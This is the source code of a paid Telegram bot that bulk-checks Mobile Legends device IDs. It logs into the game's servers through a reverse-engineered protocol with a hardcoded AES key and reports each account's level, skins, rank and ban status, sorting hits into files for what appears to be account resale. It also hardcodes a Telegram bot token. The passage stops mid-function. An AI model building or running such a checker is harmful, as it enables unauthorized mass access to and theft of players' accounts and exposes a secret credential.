#!/usr/bin/env python3
# ===================================================================
# DEV ID Checker — Telegram Bot v3.2  ◈  SHIN CYBER EDITION
# -------------------------------------------------------------------
#   Structure: main.py  |  Design: Dev.py (cyber rich → TG md)
#   • Single check + Bulk check (device IDs)
#   • Channel gate, admin panel, key system
#   • Level/Skin bracket file splitting (Dev.py scheme)
#   • Cyber banner / panels / progress bars
#   • Watermark: @SHINRT771
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib
import struct, re, logging, asyncio, zipfile, shutil, hashlib
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import NetworkError
from telegram.request import HTTPXRequest

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────

BOT_TOKEN   = "8728762913:AAFdnTyiBUuhZiwGQ1FxgbgSb9Y_B1HovXY"
OWNER_ID    = 8621676055
BOT_NAME    = "DEV ID Checker Bot"
BOT_VERSION = "3.2"
BRAND       = "@SHINRT771"

REQUIRED_CHANNELS = [
    {"name": "Codm And Mlbb",   "url": "https://t.me/CodmAndMlbb",    "id": "@CodmAndMlbb"},
    {"name": "Etoshim",         "url": "https://t.me/etoshim",        "id": "@etoshim"},
    {"name": "Shin Discussion", "url": "https://t.me/ShinDisscussion","id": "@ShinDisscussion"},
]

TELEGRAM_CONNECT_TIMEOUT = 60.0
TELEGRAM_READ_TIMEOUT    = 60.0
TELEGRAM_WRITE_TIMEOUT   = 60.0
TELEGRAM_POOL_TIMEOUT    = 60.0

MAX_THREADS_DEFAULT = 10
MAX_THREADS_LIMIT   = 50
MIN_THREADS         = 1

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR  = os.path.join(BASE_DIR, "SHIN_DEVID_OUTPUT")
DATA_DIR    = os.path.join(BASE_DIR, "data")
RESULTS_DIR = os.path.join(BASE_DIR, "Results")

for d in (DATA_DIR, RESULTS_DIR, OUTPUT_DIR):
    os.makedirs(d, exist_ok=True)

USERS_FILE  = Path(DATA_DIR) / "users.json"
KEYS_FILE   = Path(DATA_DIR) / "keys.json"

# ────────────────────────────────────────────────────────────────
# MLBB PROTOCOL
# ────────────────────────────────────────────────────────────────

AES_KEY        = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.88.1205.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'

# ────────────────────────────────────────────────────────────────
# HERO ID MAP
# ────────────────────────────────────────────────────────────────

HERO_ID_MAP: Dict[int, str] = {
    1:'Miya',2:'Balmond',3:'Saber',4:'Alice',5:'Nana',6:'Tigreal',7:'Alucard',8:'Karina',9:'Akai',10:'Franco',
    11:'Bane',12:'Bruno',13:'Clint',14:'Rafaela',15:'Eudora',16:'Zilong',17:'Fanny',18:'Layla',19:'Minotaur',20:'Lolita',
    21:'Hayabusa',22:'Freya',23:'Gord',24:'Natalia',25:'Kagura',26:'Chou',27:'Sun',28:'Alpha',29:'Ruby',30:'Yi Sun-shin',
    31:'Moskov',32:'Johnson',33:'Cyclops',34:'Estes',35:'Hilda',36:'Aurora',37:'Lapu-Lapu',38:'Vexana',39:'Roger',40:'Karrie',
    41:'Gatotkaca',42:'Harley',43:'Irithel',44:'Grock',45:'Argus',46:'Odette',47:'Lancelot',48:'Diggie',49:'Hylos',50:'Zhask',
    51:'Helcurt',52:'Pharsa',53:'Lesley',54:'Jawhead',55:'Angela',56:'Gusion',57:'Valir',58:'Martis',59:'Uranus',60:'Hanabi',
    61:"Chang'e",62:'Kaja',63:'Selena',64:'Aldous',65:'Claude',66:'Vale',67:'Leomord',68:'Lunox',69:'Hanzo',70:'Belerick',
    71:'Kimmy',72:'Thamuz',73:'Harith',74:'Minsitthar',75:'Kadita',76:'Faramis',77:'Badang',78:'Khufra',79:'Granger',80:'Guinevere',
    81:'Esmeralda',82:'Terizla',83:'X.Borg',84:'Ling',85:'Dyrroth',86:'Lylia',87:'Baxia',88:'Masha',89:'Wanwan',90:'Silvanna',
    91:'Cecilion',92:'Carmilla',93:'Atlas',94:'Popol and Kupa',95:'Yu Zhong',96:'Luo Yi',97:'Benedetta',98:'Khaleed',
    99:'Barats',100:'Brody',101:'Yve',102:'Mathilda',103:'Paquito',104:'Gloo',105:'Beatrix',106:'Phoveus',107:'Natan',108:'Aulus',
    109:'Aamon',110:'Valentina',111:'Edith',112:'Floryn',113:'Yin',114:'Melissa',115:'Xavier',116:'Julian',117:'Fredrinn',118:'Joy',
    119:'Novaria',120:'Arlott',121:'Ixia',122:'Nolan',123:'Cici',124:'Chip',125:'Zhuxin',126:'Suyou',127:'Lukas',128:'Kalea',
    129:'Zetian',130:'Obsidia'
}

def hero_name(hid) -> str:
    try:
        return HERO_ID_MAP.get(int(hid), f"Unknown({hid})")
    except (ValueError, TypeError):
        return f"Unknown({hid})"

# ────────────────────────────────────────────────────────────────
# RANK MAPPING
# ────────────────────────────────────────────────────────────────

RANK_DEFS = [
    (0,4,'Warrior III'),(5,9,'Warrior II'),(10,14,'Warrior I'),
    (15,19,'Elite IV'),(20,24,'Elite III'),(25,29,'Elite II'),(30,34,'Elite I'),
    (35,39,'Master IV'),(40,44,'Master III'),(45,49,'Master II'),(50,54,'Master I'),
    (55,59,'Grandmaster IV'),(60,64,'Grandmaster III'),(65,69,'Grandmaster II'),(70,74,'Grandmaster I'),
    (75,81,'Epic IV'),(82,88,'Epic III'),(89,95,'Epic II'),(96,107,'Epic I'),
    (108,114,'Legend IV'),(115,121,'Legend III'),(122,128,'Legend II'),(129,135,'Legend I'),
    (136,160,lambda p: f"Mythic {p-135}"),
    (161,195,lambda p: f"Mythical Honor {p-135}"),
    (196,235,lambda p: f"Mythical Glory {p-157}"),
    (236,9999,lambda p: f"Mythical Immortal {p-157}"),
]

def map_rank(p) -> str:
    try:
        p = int(p)
    except (ValueError, TypeError):
        return "Unranked"
    if p < 0: return "Unranked"
    for mn, mx, r in RANK_DEFS:
        if mn <= p <= mx:
            return r(p) if callable(r) else r
    return "Unranked"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior" in rt: return "warrior"
    if "elite" in rt: return "elite"
    if "grandmaster" in rt: return "gm"
    if "master" in rt and "grand" not in rt: return "master"
    if "epic" in rt: return "epic"
    if "legend" in rt: return "legend"
    if "mythic" in rt: return "mythic"
    return "other"

# ────────────────────────────────────────────────────────────────
# COLLECTOR TIER
# ────────────────────────────────────────────────────────────────

def map_collector_point(point) -> str:
    if not point or not isinstance(point, (int, float)):
        return "N/A"
    point = int(point)
    if point < 1000: return 'No Tier'
    tiers = [
        (1000, 4000, 'Amateur Collector'),(4000, 10000, 'Junior Collector'),
        (10000, 22000, 'Seasoned Collector'),(22000, 44000, 'Expert Collector'),
        (44000, 84000, 'Renowned Collector'),(84000, 160000, 'Exalted Collector'),
        (160000, 280000, 'Mega Collector'),(280000, float('inf'), 'World Collector'),
    ]
    for mn, mx, name in tiers:
        if mn <= point < mx:
            if name == 'World Collector': return 'World Collector'
            per_level = (mx - mn) / 5
            level = max(0, min(4, int((point - mn) // per_level)))
            roman = ['V', 'IV', 'III', 'II', 'I'][level]
            return f"{name} {roman}"
    return 'Unknown'

_BAN_CODES = {1:'Banned(perm)', 2:'Banned(temp)', 3:'Banned', 4:'Suspended', 5:'Restricted'}

def fmt_ts(ts) -> str:
    if not ts: return "N/A"
    try:
        return datetime.fromtimestamp(int(ts), tz=timezone.utc).astimezone(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "N/A"

# ────────────────────────────────────────────────────────────────
# LOGGING
# ────────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)-7s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
log = logging.getLogger("shinbot")

# ════════════════════════════════════════════════════════════════
# CYBER DESIGN LAYER — Dev.py aesthetic, ported to Telegram md
# ════════════════════════════════════════════════════════════════

LINE_HEAVY = "━" * 28
LINE_THIN  = "─" * 28
LINE_DOT   = "┈" * 28

# box-drawing banner (mirrors Dev.py figlet + panel)
BANNER = (
    "```\n"
    "  ███╗   ███╗██╗     ██████╗ ██████╗ \n"
    "  ████╗ ████║██║     ██╔══██╗██╔══██╗\n"
    "  ██╔████╔██║██║     ██████╔╝██████╔╝\n"
    "  ██║╚██╔╝██║██║     ██╔══██╗██╔══██╗\n"
    "  ██║ ╚═╝ ██║███████╗██████╔╝██████╔╝\n"
    "  ╚═╝     ╚═╝╚══════╝╚═════╝ ╚═════╝ \n"
    "```"
)

def banner_line() -> str:
    return f"◇  *D E V  I D  C H E C K E R*  ◇\n_{LINE_DOT}_\n`⚡ CYBER SCANNER ⚡  v{BOT_VERSION}`\n`⟐  Real-time Device ID Scanner  ⟐`"

def panel_title(title: str) -> str:
    return f"◇  *{title.upper()}*  ◇\n{LINE_HEAVY}"

def panel_footer() -> str:
    return f"{LINE_HEAVY}\n👑 {BRAND}"

def _bar(pct: float, width: int = 20) -> str:
    pct = max(0.0, min(100.0, pct))
    f = int(width * pct / 100)
    return "█" * f + "░" * (width - f)

def _fmt_secs(s) -> str:
    s = int(max(0, s))
    if s < 60: return f"{s}s"
    m, s = divmod(s, 60)
    if m < 60: return f"{m}m{s}s"
    h, m = divmod(m, 60); return f"{h}h{m}m"

def _stat(icon: str, label: str, value, last: bool = False) -> str:
    branch = "┗" if last else "┣"
    return f"{branch} {icon}  {label:<11}: `{value}`"

# Level + Skin brackets — mirror Dev.py's file splitting
LEVEL_BRACKETS = [
    (9,   30,  "level_9-30.txt",   "lv_9_30"),
    (31,  50,  "level_31-50.txt",  "lv_31_50"),
    (51,  100, "level_51-100.txt", "lv_51_100"),
    (101, 200, "level_101-200.txt","lv_101_200"),
    (201, 9999,"level_200plus.txt","lv_200_plus"),
]
SKIN_BRACKETS = [
    (20,  50,  "skin_20-50.txt",     "sk_20_50"),
    (51,  100, "skin_51-100.txt",    "sk_51_100"),
    (101, 200, "skin_101-200.txt",   "sk_101_200"),
    (201, 300, "skin_201-300.txt",   "sk_201_300"),
    (301, 400, "skin_301-400.txt",   "sk_301_400"),
    (401, 9999,"skin_401-700plus.txt","sk_401_plus"),
]

# ── success line — same vibe as Dev.py's _rtxt ──
def line_success(did: str, pd: Dict[str, Any]) -> str:
    sid = did[-8:] if len(did) >= 8 else did
    lvl = pd.get("level", "?")
    sk  = pd.get("skin_count", "?")
    rank = str(pd.get("current_rank", "?"))[:14]
    ban = str(pd.get("ban_status", ""))
    base = (
        f"✅  `…{sid}`  ┃  *{_esc(str(pd.get('nickname','?'))[:20])}*"
        f"  ┃  `Lv:{lvl}`  ┃  `🆔{pd.get('account_id','?')}`"
        f"  ┃  `🌐{pd.get('zone_id','?')}`  ┃  `🎨{sk}`  ┃  `🏆{rank}`"
    )
    if "ban" in ban.lower() or "suspend" in ban.lower():
        base += f"  ⚠️ `{ban[:18]}`"
    return base

def line_error(did: str, err: str) -> str:
    sid = did[-8:] if len(did) >= 8 else did
    return f"❌  `…{sid}`  ┃  _{_esc(err[:60])}_"

def _esc(s: str) -> str:
    return str(s).replace("`", "'").replace("*", "").replace("_", " ")

# ── single check card — Dev.py's info-panel vibe ──
def render_card(did: str, pd: Dict[str, Any]) -> str:
    acc   = pd.get("account_id", "?")
    zone  = pd.get("zone_id", "?")
    nick  = pd.get("nickname", "N/A")
    level = pd.get("level", "N/A")
    skins = pd.get("skin_count", "N/A")
    heroes= pd.get("hero_count", "N/A")
    cur   = pd.get("current_rank", "Unranked")
    high  = pd.get("highest_rank", "N/A")
    coll  = pd.get("collector_tier", "N/A")
    cpt   = pd.get("collector_point")
    cpt_s = f"{int(cpt):,}" if isinstance(cpt, (int, float)) and cpt > 0 else "N/A"
    loc   = pd.get("location") or "NOT FOUND"
    ll    = pd.get("last_login") or "N/A"
    squad = pd.get("squad") or "N/A"
    wr    = pd.get("win_rate", "N/A")
    ban   = pd.get("ban_status", "Not Banned")
    v2l   = pd.get("v2l_status", "N/A")
    hh    = pd.get("hero_history") or []
    hh_s  = ", ".join(str(x) for x in hh[:5]) if hh else "N/A"
    found = datetime.now(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S")

    return (
        "```\n"
        f"╔══════════════════════════════════════════════════╗\n"
        f"║   ◇  DEVICE ID CHECK RESULT  ◇                   ║\n"
        f"╚══════════════════════════════════════════════════╝\n"
        "```\n"
        f"{panel_title('Identity')}\n"
        f"┣ 🆔 Device : `{did[:44]}`\n"
        f"┣ 🎮 Acc    : `{acc}`\n"
        f"┣ 🌐 Zone   : `{zone}`\n"
        f"┣ 🏷 Nick   : *{_esc(nick)}*\n"
        f"┣ 📈 Level  : `{level}`\n"
        f"┣ 🦸 Heroes : `{heroes}`\n"
        f"┗ 🎨 Skins  : `{skins}`\n"
        f"\n{panel_title('Ranks')}\n"
        f"┣ 🏆 Current: `{cur}`\n"
        f"┣ ⭐ High   : `{high}`\n"
        f"┣ 💠 Collector: `{coll}`\n"
        f"┗ 💎 Points : `{cpt_s}`\n"
        f"\n{panel_title('Account')}\n"
        f"┣ 🚫 Ban    : `{ban}`\n"
        f"┣ 🧪 V2L    : `{v2l}`\n"
        f"┣ 📍 Loc    : `{loc}`\n"
        f"┣ ⏰ Login  : `{ll}`\n"
        f"┣ 👥 Squad  : `{squad}`\n"
        f"┣ 🎯 WR     : `{wr}`\n"
        f"┗ 🦸 Recent : `{hh_s}`\n"
        f"\n{LINE_DOT}\n"
        f"🕒 Found : `{found}`\n"
        f"👑 {BRAND}"
    )

# ── live progress panel — Dev.py's _stats_panel vibe ──
def render_live(snap: Dict[str, Any], status: str = "RUNNING") -> str:
    total   = max(snap["total"], 1)
    checked = snap["checked"]
    pct     = checked / total * 100
    elapsed = snap["elapsed"]
    cpm     = int(checked / max(elapsed, 0.001) * 60)
    spd     = snap.get("live_rate", checked / max(elapsed, 0.001))
    rem     = max(total - checked, 0)
    eta     = snap.get("eta", 0)
    icon = {"RUNNING":"⚡","STOPPING":"🛑","FINISHED":"✅"}.get(status, "⚡")

    return (
        f"{icon}  *LIVE SCAN MONITOR*\n{LINE_HEAVY}\n"
        f"`{_bar(pct, 22)}` *{pct:5.1f}%*\n\n"
        f"{panel_title('Progress')}\n"
        f"{_stat('⏳','Checked', checked)}\n"
        f"{_stat('⏹','Remain',  rem)}\n"
        f"{_stat('📁','Total',   total)}\n"
        f"{_stat('⏱','Elapsed', _fmt_secs(elapsed), last=True)}\n"
        f"\n{panel_title('Results')}\n"
        f"{_stat('✅','Valid',   snap['hits'])}\n"
        f"{_stat('🚫','Banned',  snap['banned'])}\n"
        f"{_stat('❌','Invalid', snap['failed'], last=True)}\n"
        f"\n{panel_title('Speed')}\n"
        f"┣ ⚡ Rate : `{spd:.1f}/s`\n"
        f"┣ 🔥 CPM  : `{cpm}`\n"
        f"┗ ⏳ ETA  : `{_fmt_secs(eta)}`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

# ── summary panel — Dev.py's _make_summary vibe ──
def render_summary(snap: Dict[str, Any], elapsed: float, sdir: str) -> str:
    total = snap["total"]; hits = snap["hits"]; banned = snap["banned"]
    failed = snap["failed"]; spd = total / max(elapsed, 0.001)
    lv = snap.get("lv", {}); sk = snap.get("sk", {})
    lv_rows = "\n".join(
        f"┣ 📈 {a}-{b}  : `{lv.get(key,0)}`"
        for a, b, _, key in LEVEL_BRACKETS[:-1]
    )
    lv_last = f"┗ 📈 {LEVEL_BRACKETS[-1][0]}+    : `{lv.get(LEVEL_BRACKETS[-1][3],0)}`"
    sk_rows = "\n".join(
        f"┣ 🎨 {a}-{b}  : `{sk.get(key,0)}`"
        for a, b, _, key in SKIN_BRACKETS[:-1]
    )
    sk_last = f"┗ 🎨 {SKIN_BRACKETS[-1][0]}+    : `{sk.get(SKIN_BRACKETS[-1][3],0)}`"
    folder = os.path.basename(sdir)
    return (
        "✅  *SCAN COMPLETE*\n"
        f"{LINE_HEAVY}\n\n"
        f"{panel_title('Metrics')}\n"
        f"{_stat('✅','Valid',   hits)}\n"
        f"{_stat('🚫','Banned',  banned)}\n"
        f"{_stat('❌','Invalid', failed)}\n"
        f"{_stat('📁','Total',   total)}\n"
        f"{_stat('⏱','Time',   _fmt_secs(elapsed))}\n"
        f"{_stat('⚡','Speed',  f'{spd:.1f}/s', last=True)}\n"
        f"\n{panel_title('Level Distribution')}\n{lv_rows}\n{lv_last}\n"
        f"\n{panel_title('Skin Distribution')}\n{sk_rows}\n{sk_last}\n"
        f"\n{panel_title('Output')}\n"
        f"┣ 📂 Folder : `{folder}/`\n"
        f"┣ 📄 all_valid.txt\n"
        f"┣ 📂 levels/\n"
        f"┣ 📂 skins/\n"
        f"┗ 📄 summary.txt\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
)

# ── welcome / no-key / help / menu — cyber skinned ──
def render_welcome(name: str, is_admin: bool, expiry: str, checked: int, hits: int) -> str:
    role = "👑  Admin — unlimited access" if is_admin else f"🎟️  Access until: `{expiry}`"
    return (
        f"{banner_line()}\n{LINE_HEAVY}\n"
        f"Welcome, *{_esc(name)}*!\n\n{role}\n\n"
        f"{panel_title('Your Stats')}\n"
        f"{_stat('🔍','Checked', checked)}\n"
        f"{_stat('🎯','Hits',    hits, last=True)}\n\n"
        f"{panel_title('How to use')}\n"
        f"┣ 🔥 Bulk Check → send a `.txt` file\n"
        f"┣ 🔍 Single Check → send a Device ID\n"
        f"┗ 📊 Stats → hit counters\n\n"
        f"{panel_title('Required Channels')}\n"
        + "\n".join(f"┣ 📢 [{c['name']}]({c['url']})" for c in REQUIRED_CHANNELS[:-1])
        + f"\n┗ 📢 [{REQUIRED_CHANNELS[-1]['name']}]({REQUIRED_CHANNELS[-1]['url']})\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_no_key() -> str:
    return (
        f"{banner_line()}\n{LINE_HEAVY}\n"
        "🔒  *ACCESS RESTRICTED*\n\n"
        "This tool requires an access key.\n\n"
        f"{panel_title('Pricing')}\n"
        "┣ 💳 3 Days    · ₱50\n"
        "┣ 💳 7 Days    · ₱70\n"
        "┣ 💳 1 Month   · ₱100\n"
        "┗ 💳 Lifetime  · ₱150\n\n"
        f"📩 Contact admin: {BRAND}\n"
        f"`/redeem <key>` to activate\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_menu() -> str:
    return (
        f"{banner_line()}\n{LINE_HEAVY}\n"
        f"{panel_title('Menu')}\n"
        "┣ 🔥 Bulk Check — `.txt` of device IDs\n"
        "┣ 🔍 Single Check — one device ID\n"
        "┣ 📊 Statistics — rank counters\n"
        "┣ 💳 Buy Access Key\n"
        "┗ 📖 Help\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

# ════════════════════════════════════════════════════════════════
# MEMBERSHIP GATE
# ════════════════════════════════════════════════════════════════

_membership_cache = {}
_membership_lock = threading.Lock()
_MEMBERSHIP_TTL = 60.0

async def check_membership(bot, user_id):
    if user_id == OWNER_ID: return True, []
    now = time.time()
    with _membership_lock:
        cached = _membership_cache.get(user_id)
        if cached and (now - cached[0]) < _MEMBERSHIP_TTL:
            return cached[1], cached[2]
    missing = []
    for ch in REQUIRED_CHANNELS:
        try:
            m = await bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if m.status in ("left","kicked"): missing.append(ch["name"])
        except Exception as e:
            log.warning(f"Membership check failed for {ch['id']}: {e}")
    ok = (len(missing) == 0)
    with _membership_lock:
        _membership_cache[user_id] = (now, ok, missing)
    return ok, missing

def invalidate_membership(user_id):
    with _membership_lock:
        _membership_cache.pop(user_id, None)

def kb_join_channels():
    rows = []
    for ch in REQUIRED_CHANNELS:
        rows.append([InlineKeyboardButton(f"📢  Join  {ch['name']}", url=ch["url"])])
    rows.append([InlineKeyboardButton("✅  I've Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)

def render_join_gate(first_name="there"):
    lines = [
        "◇  *CHANNEL VERIFICATION REQUIRED*  ◇",
        LINE_HEAVY, "",
        f"Hey *{_esc(first_name)}*, join all three channels to unlock the bot:", ""
    ]
    for ch in REQUIRED_CHANNELS:
        lines.append(f"  📢  [{ch['name']}]({ch['url']})")
    lines += ["", LINE_HEAVY, "After joining, tap *✅ I've Joined — Verify*", "", f"👑 {BRAND}"]
    return "\n".join(lines)

async def gate(update, ctx):
    user = update.effective_user
    if user.id == OWNER_ID: return True
    ok, _ = await check_membership(ctx.bot, user.id)
    if ok: return True
    text = render_join_gate(user.first_name or "there")
    kb = kb_join_channels()
    if update.callback_query:
        try:
            await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
        except Exception:
            await ctx.bot.send_message(chat_id=user.id, text=text, parse_mode="Markdown", reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
    return False

# ════════════════════════════════════════════════════════════════
# SDP PROTOCOL
# ════════════════════════════════════════════════════════════════

class SdpDataType(Enum):
    INTEGER_POSITIVE=0; INTEGER_NEGATIVE=1; FLOAT=2; DOUBLE=3
    STRING=4; LIST=5; DICT=6; STRUCT_BEGIN=7; STRUCT_END=8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''; self.offset = 0
        if isinstance(data, bytes):
            self.data = data; self._unpack()
        elif data is not None:
            self.update(data); self._pack()
    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()): self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])
    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value: self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
            self[k] = v
    def _write_varint(self, n):
        res = bytearray()
        while n >= 0x80: res.append((n & 0x7F) | 0x80); n >>= 7
        res.append(n & 0x7F); return bytes(res)
    def _read_varint(self):
        n = 1; val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n); n += 1
        self.offset += n; return val
    def _pack_header(self, tag, dtype):
        if tag < 15: self.data += bytes([(dtype.value << 4) | tag])
        else: self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)
    def _pack_item(self, tag, val):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0: self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE); self.data += self._write_varint(-val)
            else: self._pack_header(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE); self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST); self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT); self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()): self._pack_item(0, k); self._pack_item(0, v)
        else: raise Exception("Unsupported type")
    def _unpack_item(self):
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]; tag = hdr & 0xF; dtype = SdpDataType(hdr >> 4); self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._read_varint().to_bytes(4,'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8,'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._read_varint(); raw = self.data[self.offset:self.offset+l]; self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._read_varint(); return tag, [self._unpack_item()[1] for _ in range(l)]
        if dtype == SdpDataType.DICT:
            l = self._read_varint(); res = {}
            for _ in range(l):
                _, k = self._unpack_item(); _, v = self._unpack_item(); res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

def sdp_to_plain(obj):
    if isinstance(obj, SdpStruct): return {k: sdp_to_plain(v) for k, v in obj.items()}
    if isinstance(obj, dict): return {k: sdp_to_plain(v) for k, v in obj.items()}
    if isinstance(obj, list): return [sdp_to_plain(v) for v in obj]
    if isinstance(obj, bytes):
        try: return obj.decode('utf-8')
        except: return obj.hex()
    return obj

# ════════════════════════════════════════════════════════════════
# CONNECTION
# ════════════════════════════════════════════════════════════════

class BaseConnection:
    def __init__(self, host, port):
        self.host = host; self.port = port; self.sequence = 1
        self.socket = None; self.queue = b''
    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try: self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except: pass
        self.socket.connect((self.host, self.port)); self.socket.settimeout(10)
    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1; self.socket = None
    def __enter__(self): self.connect(); return self
    def __exit__(self, *args): self.cleanup()
    def send_data(self, pid, sdp):
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.sendall(flags.to_bytes(4, 'big') + comp); self.sequence += 1
    def recv_data(self):
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(8192)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF; ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(8192)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]; self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data); pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConnection):
    def __init__(self, device_id):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
    def run(self):
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e: return None, None, f"ERROR ({e})"
        finally: self.cleanup()

class GameConnection(BaseConnection):
    def __init__(self, device_id):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
        self.account_id = 0; self.session_key = ''; self.zone_id = 0
        self.game_host = ''; self.game_port = 0
        self.ban_status = "NORMAL"; self.ban_end_ts = 0
        self.debug_responses = []
    def _rec(self, label, req_pid, resp_pid, res):
        self.debug_responses.append({"label": label, "req_pid": req_pid,
                                     "resp_pid": resp_pid,
                                     "data": sdp_to_plain(res) if res else None})
    def login_to_login_server(self):
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup(); self.host, self.port = SERVER_HOST, SERVER_PORT; self.connect()
        self.send_data(1, SdpStruct({0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE}))
        pid, res = self.recv_data(); self._rec("login", 1, pid, res)
        if pid == 2 and res:
